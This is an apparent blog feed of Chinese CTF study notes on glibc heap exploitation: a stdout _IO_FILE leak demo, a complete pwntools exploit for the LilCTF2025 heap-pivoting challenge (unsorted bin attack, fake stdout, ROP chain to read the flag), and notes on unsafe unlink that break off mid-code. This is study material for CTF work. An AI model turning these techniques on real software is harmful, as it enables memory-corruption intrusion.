class="type">uint64_t</span>)&amp;<span class="built_in">printf</span>;</span><br><span class="line">    <span class="type">uint64_t</span> stdout_addr = printf_addr + <span class="number">0x1bb090</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stdout addr is --&gt; %p\n&quot;</span>, stdout_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- input &gt;&gt;&gt;\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, victim, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- leak  &gt;&gt;&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//全缓冲</span></span><br><span class="line">    *(<span class="type">int</span>*)stdout_addr = <span class="number">0xfbad1800</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">1</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_ptr</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_end</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">3</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">4</span>] = (<span class="type">uint64_t</span>)victim;           <span class="comment">// _IO_write_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">5</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_ptr  必须大于 base 才会写出</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">6</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x100</span>;    <span class="comment">// _IO_write_end &gt; ptr </span></span><br><span class="line"></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new_data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行发现<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">new_data</span><br><span class="line">[Inferior 1 (process 76592) exited normally]</span><br></pre></td></tr></table></figure><p><code>fflush(stdout)</code>后可以成功输出leak的数据，而全缓冲模式，缓冲区未填满后续的new_data则需要<code>exit</code>刷新<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exit()</span><br><span class="line">  └─ _IO_cleanup()</span><br><span class="line">       └─ _IO_flush_all_lockp(NULL)</span><br><span class="line">            ├─ 遍历全局 FILE* 链表 _IO_list_all</span><br><span class="line">            └─ 对每个 FILE 调用 _IO_file_overflow/_IO_do_write 进行 flush</span><br></pre></td></tr></table></figure><p>如果我们填满缓冲区（笔者本地默认0x400）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x81</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new_data&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">new_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_data</span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br></pre></td></tr></table></figure><p>而如果仅仅设置输出0x100的数据（<code>_IO_write_end</code>&#x3D;<code>victim+0x100</code>）,是仍然没有输出的，显然缓冲区大小不是通过<code>write</code>三元组来判定的<br></p><h2 id="0x04-LilCTF2025-heap-pivoting"><a href="#0x04-LilCTF2025-heap-pivoting" class="headerlink" title="0x04 LilCTF2025 heap-pivoting"></a>0x04 LilCTF2025 heap-pivoting</h2><p>开了沙箱，打<code>orw</code>，问题是没有show函数，而且全程没有调用io的函数，但是没有开pie，又是静态编译，相当于给了libc地址，我们能做的只有一个<code>unsorted bin attack</code>，这个时候问题就来了，往哪里写，大家如果了解过<code>unsorted bin attack</code>的话，就会知道我们写的其实是<code>top chunk</code>的地址（<code>main_arena</code>中的一定偏移处），就可以根据这个，修改<code>top chunk</code>的位置，迁移到<code>chunk_list</code>上面，达到任意地址写，然后调用<code>fflush</code>，打<code>stdout</code>，泄露栈地址（<code>rsp</code>），最后劫持<code>rsp</code>写<code>rop</code>就行（此题程序执行到这里自己会<code>ret</code>，也就是<code>pop rip</code>）<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.23-0ubuntu3/amd64/libc6_2.23-0ubuntu3_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;gz.imxbt.cn&quot;</span></span><br><span class="line">port = <span class="number">20119</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">set glibc 2.23</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your exploit here</span></span><br><span class="line">menu = <span class="string">b&#x27;Your choice:\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">idx, data</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;say\n&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;context: &#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myexit</span>():</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chunk_list = <span class="number">0x6ccd60</span></span><br><span class="line"><span class="comment">#global_max_fast = 0x6cc638</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leave_ret = 0x400aa5</span></span><br><span class="line"><span class="comment">#syscall = 0x4003da</span></span><br><span class="line"><span class="comment">#pop_rax_ret = 0x41fc84</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401a16</span></span><br><span class="line">pop_rdx_rsi_ret = <span class="number">0x443159</span></span><br><span class="line">ret = <span class="number">0x4002e1</span> </span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">alloc(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x6ca858</span>) + p64(chunk_list - <span class="number">0x10</span>))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(chunk_list) + p64(<span class="number">0</span>) + p64(<span class="number">0x6ca858</span>)*<span class="number">2</span>) <span class="comment">#这里就是修改main_arena, 0x6ca858是unsortedbin头地址</span></span><br><span class="line">alloc(<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment">#这里chunk4就是chunk_list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">addr, data</span>): <span class="comment">#任意地址写</span></span><br><span class="line">    edit(<span class="number">4</span>, p64(addr))</span><br><span class="line">    edit(<span class="number">2</span>, data) <span class="comment">#堆头0x10,所以写入地址位于chunk_list[2]</span></span><br><span class="line"></span><br><span class="line">fflush = <span class="number">0x416770</span></span><br><span class="line">environ = <span class="number">0x6cc640</span></span><br><span class="line">stdout = <span class="number">0x6ca300</span></span><br><span class="line">free_hook = <span class="number">0x6cc5e8</span></span><br><span class="line"></span><br><span class="line">fake_io = p64(<span class="number">0xfbad1800</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line">fake_io += p64(environ)  <span class="comment"># _IO_write_base</span></span><br><span class="line">fake_io += p64(environ + <span class="number">0x10</span>)  <span class="comment"># _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">hack(stdout, fake_io)</span><br><span class="line">hack(free_hook, p64(fflush))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># fflush(0) 效果是刷新所有输出方向的io流</span></span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak addr in stack --&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">rsp = leak_addr - <span class="number">0x180</span></span><br><span class="line">log.info(<span class="string">&quot;rsp --&gt; &quot;</span>+<span class="built_in">hex</span>(rsp))</span><br><span class="line"></span><br><span class="line">rop_chain = p64(pop_rdi_ret) + p64(rsp - <span class="number">0x8</span>) + \</span><br><span class="line">        p64(pop_rdx_rsi_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(<span class="number">0x43fc40</span>) + \</span><br><span class="line">        p64(pop_rdi_ret) + p64(<span class="number">3</span>) + \</span><br><span class="line">        p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(rsp + <span class="number">0x100</span>) + \</span><br><span class="line">        p64(<span class="number">0x43fca0</span>) + \</span><br><span class="line">        p64(pop_rdi_ret) + p64(<span class="number">1</span>) + \</span><br><span class="line">        p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(rsp + <span class="number">0x100</span>) + \</span><br><span class="line">        p64(<span class="number">0x43fd00</span>)</span><br><span class="line"></span><br><span class="line">hack(rsp-<span class="number">0x8</span>, <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span> + rop_chain)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于unsafe unlink与unsortedbin attack</title>
      <link href="/2025/08/18/%E5%85%B3%E4%BA%8Eunsafe-unlink%E4%B8%8Eunsortedbin-attack/"/>
      <url>/2025/08/18/%E5%85%B3%E4%BA%8Eunsafe-unlink%E4%B8%8Eunsortedbin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在打lilctf的一道堆题的时候意识到自己还没记录过关于<code>unsafe unlink</code>与<code>unsortedbin attack</code>,于是来记录一下<br></p><h2 id="0x01-关于unsafe-unlink"><a href="#0x01-关于unsafe-unlink" class="headerlink" title="0x01 关于unsafe unlink"></a>0x01 关于unsafe unlink</h2><p>从双向链表取出chunk的过程即为unlink（在 glibc 源码中，<code>unlink</code> 是一个宏&#x2F;函数，用来把一个双向链表中的 bin 链接节点（chunk）移除）,如下所示<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">      || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">          fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">          p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">          p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>什么时候会进行unlink呢？一是<code>free</code> 合并相邻空闲<code>chunk</code>时，需要把相邻块从bin中移除；<code>malloc</code>从 bin 中取出 <code>chunk</code>时，需要把该<code> chunk</code> 从 bin 中移除。当然还有一些特殊情况时候也会进行<code>unlink</code>，不赘述<br>既然是<code>unsafe unlink</code>，我们看其检查机制<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>主要就是检查<code>presize</code>和<code>size</code>是否相同，以及要求<code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code>（也就是双向链表的完整性）<br>如果我们修改<code>P-&gt;fd</code>和<code>P-&gt;bk</code>并且绕过上面的检查，也就可以进行一些“unsafe”的操作<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>也就是可以利用这里进行攻击<br>话不多说写个demo调试（使用how2heap的源码并进行了一些修改）就明白了（于glibc2.35）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> chunk_list[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x420</span>; </span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); </span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); </span><br><span class="line">chunk_list[<span class="number">0</span>] = (<span class="type">uint64_t</span>) chunk0_ptr;</span><br><span class="line">chunk_list[<span class="number">1</span>] = (<span class="type">uint64_t</span>) chunk1_ptr;</span><br><span class="line"></span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) chunk_list - (<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) chunk_list - (<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = <span class="number">0x421</span>;</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> victim_str[<span class="number">8</span>] = <span class="string">&quot;victim&quot;</span>;</span><br><span class="line"><span class="type">char</span> hacked[<span class="number">8</span>] = <span class="string">&quot;hacked&quot;</span>;</span><br><span class="line">*((<span class="type">uint64_t</span>*)chunk_list[<span class="number">0</span>]+<span class="number">3</span>) = (<span class="type">uint64_t</span>) victim_str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------- original vaule of victim_str is -------\n%s\n&quot;</span>, victim_str);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)chunk_list[<span class="number">0</span>], hacked);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------- new vaule of victim_str is      -------\n%s\n&quot;</span>, victim_str);</span><br><span 